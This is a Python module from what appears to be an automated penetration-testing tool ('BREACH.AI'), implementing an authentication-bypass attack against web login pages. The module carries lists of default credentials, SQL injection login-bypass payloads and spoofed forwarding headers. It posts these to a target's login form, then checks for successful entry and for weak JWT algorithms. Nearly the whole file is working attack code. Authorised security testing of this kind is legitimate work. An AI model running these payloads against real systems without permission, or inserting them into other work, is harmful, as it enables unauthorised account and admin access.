"""
BREACH.AI - Authentication Attack Module

Tests for authentication vulnerabilities including:
- Default credentials
- Authentication bypass
- Session attacks
- JWT vulnerabilities
"""

import base64
import json
import re
from typing import Optional

from backend.breach.attacks.base import AttackResult, BaseAttack
from backend.breach.core.memory import AccessLevel, Severity
from backend.breach.utils.http import HTTPClient, HTTPResponse
from backend.breach.utils.logger import logger


class AuthBypassAttack(BaseAttack):
    """Authentication bypass and weakness testing."""

    name = "Authentication Bypass"
    attack_type = "auth_bypass"
    description = "Tests for authentication vulnerabilities"
    severity = Severity.CRITICAL
    owasp_category = "A07:2021 Identification and Authentication Failures"
    cwe_id = 287

    # Default credentials to test
    DEFAULT_CREDS = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "123456"),
        ("administrator", "administrator"),
        ("root", "root"),
        ("root", "toor"),
        ("test", "test"),
        ("user", "user"),
        ("guest", "guest"),
        ("admin", "admin123"),
        ("admin", ""),
        ("", ""),
    ]

    # SQL injection auth bypass
    SQLI_BYPASS = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'#",
        "' OR '1'='1'/*",
        "admin'--",
        "admin'#",
        "') OR ('1'='1",
        "') OR ('1'='1'--",
        "' OR 1=1--",
        "\" OR 1=1--",
    ]

    # Auth bypass headers
    BYPASS_HEADERS = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Host": "localhost"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
    ]

    def get_payloads(self) -> list[str]:
        return self.SQLI_BYPASS

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Check for authentication vulnerabilities."""
        # Check for login form
        response = await self.http_client.get(url)

        # Look for login indicators
        login_indicators = ["login", "signin", "password", "username", "email"]
        has_login = any(ind in response.body.lower() for ind in login_indicators)

        return has_login

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Test for authentication bypass."""
        result = self._create_result(False, url, parameter)

        # Step 1: Try default credentials
        default_result = await self._try_default_creds(url)
        if default_result:
            result.success = True
            result.payload = f"{default_result['username']}:{default_result['password']}"
            result.details = f"Default credentials work: {default_result['username']}"
            result.access_gained = AccessLevel.ADMIN if "admin" in default_result['username'].lower() else AccessLevel.USER
            result.add_evidence("default_creds", "Default credentials accepted", result.payload)
            return result

        # Step 2: Try SQL injection bypass
        sqli_result = await self._try_sqli_bypass(url)
        if sqli_result:
            result.success = True
            result.payload = sqli_result["payload"]
            result.details = "SQL injection authentication bypass"
            result.access_gained = AccessLevel.USER
            result.add_evidence("sqli_bypass", "SQL injection bypassed authentication", sqli_result["payload"])
            return result

        # Step 3: Try header-based bypass
        header_result = await self._try_header_bypass(url)
        if header_result:
            result.success = True
            result.payload = str(header_result["headers"])
            result.details = f"Header bypass: {list(header_result['headers'].keys())[0]}"
            result.add_evidence("header_bypass", "Header-based authentication bypass", str(header_result["headers"]))
            return result

        # Step 4: Check JWT vulnerabilities if present
        jwt_result = await self._check_jwt_vulnerabilities(url)
        if jwt_result:
            result.success = True
            result.payload = jwt_result.get("payload", "")
            result.details = f"JWT vulnerability: {jwt_result['type']}"
            result.add_evidence("jwt_vuln", jwt_result['type'], jwt_result.get("details", ""))
            return result

        return result

    async def _try_default_creds(self, url: str) -> Optional[dict]:
        """Try default credentials."""
        # Find login form
        response = await self.http_client.get(url)

        # Extract form fields
        username_field = self._find_field(response.body, ["username", "user", "email", "login"])
        password_field = self._find_field(response.body, ["password", "pass", "pwd"])

        if not username_field or not password_field:
            return None

        for username, password in self.DEFAULT_CREDS:
            data = {
                username_field: username,
                password_field: password,
            }

            login_response = await self.http_client.post(url, data=data)

            # Check for successful login indicators
            if self._is_login_successful(login_response, response):
                return {"username": username, "password": password}

        return None

    async def _try_sqli_bypass(self, url: str) -> Optional[dict]:
        """Try SQL injection authentication bypass."""
        response = await self.http_client.get(url)

        username_field = self._find_field(response.body, ["username", "user", "email", "login"])
        password_field = self._find_field(response.body, ["password", "pass", "pwd"])

        if not username_field or not password_field:
            return None

        for payload in self.SQLI_BYPASS:
            data = {
                username_field: payload,
                password_field: "anything",
            }

            login_response = await self.http_client.post(url, data=data)

            if self._is_login_successful(login_response, response):
                return {"payload": payload}

        return None

    async def _try_header_bypass(self, url: str) -> Optional[dict]:
        """Try header-based authentication bypass."""
        baseline = await self.http_client.get(url)

        for headers in self.BYPASS_HEADERS:
            response = await self.http_client.get(url, headers=headers)

            # Check if we got different/privileged content
            if response.status_code == 200 and baseline.status_code != 200:
                return {"headers": headers}

            # Check for admin content
            if "admin" in response.body.lower() and "admin" not in baseline.body.lower():
                return {"headers": headers}

        return None

    async def _check_jwt_vulnerabilities(self, url: str) -> Optional[dict]:
        """Check for JWT vulnerabilities."""
        response = await self.http_client.get(url)

        # Look for JWT in response or cookies
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        jwt_match = re.search(jwt_pattern, response.body)

        if not jwt_match:
            # Check cookies
            for cookie_value in self.http_client.cookies.values():
                if re.match(jwt_pattern, cookie_value):
                    jwt_match = re.match(jwt_pattern, cookie_value)
                    break

        if not jwt_match:
            return None

        jwt_token = jwt_match.group(0)

        # Decode JWT
        try:
            parts = jwt_token.split('.')
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

            vulnerabilities = []

            # Check for 'none' algorithm vulnerability
            if header.get('alg', '').lower() == 'none':
                vulnerabilities.append("Algorithm 'none' accepted")

            # Check for weak algorithm
            if header.get('alg', '').upper() in ['HS256', 'HS384', 'HS512']:
                vulnerabilities.append("Symmetric algorithm used (potential key brute-force)")

            if vulnerabilities:
                return {
                    "type": ", ".join(vulnerabilities),
                    "payload": jwt_token[:50] + "...",
                    "details": f"Header: {header}, Payload keys: {list(payload.keys())}"
                }

        except Exception as e:
            logger.debug(f"JWT analysis failed: {e}")

        return None

    def _find_field(self, html: str, names: list[str]) -> Optional[str]:
        """Find form field name."""
        for name in names:
            pattern = rf'name=["\']({name}[^"\']*)["\']'
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return match.group(1)
        return None

    def _is_login_successful(
        self,
        response: HTTPResponse,
        baseline: HTTPResponse
    ) -> bool:
        """Check if login was successful."""
        # Redirect to different page
        if response.redirect_url and "login" not in response.redirect_url.lower():
            return True

        # Success indicators in response
        success_indicators = ["welcome", "dashboard", "logout", "profile", "account"]
        failure_indicators = ["invalid", "incorrect", "failed", "error", "wrong"]

        body_lower = response.body.lower()

        has_success = any(ind in body_lower for ind in success_indicators)
        has_failure = any(ind in body_lower for ind in failure_indicators)

        if has_success and not has_failure:
            return True

        # Session cookie set
        if response.cookies and not baseline.cookies:
            return True

        return False
